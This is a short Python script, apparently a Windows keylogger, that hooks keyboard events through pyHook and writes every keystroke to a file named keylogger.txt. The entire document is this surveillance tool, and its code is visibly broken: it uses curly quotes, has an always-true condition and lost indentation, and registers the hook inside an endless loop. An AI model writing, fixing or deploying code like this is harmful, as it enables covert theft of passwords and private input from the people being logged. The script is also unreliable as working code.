import win32api
import sys
import pythoncom, pyHook
buffer = ”
def OnKeyboardEvent(event):
if event.Ascii != 0 or 8:
f = open (‘keylogger.txt’, ‘a’) #store all keys on the file keylogger.txt
keylogs = chr(event.Ascii)
f.write(keylogs)
f.close()
while True:
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
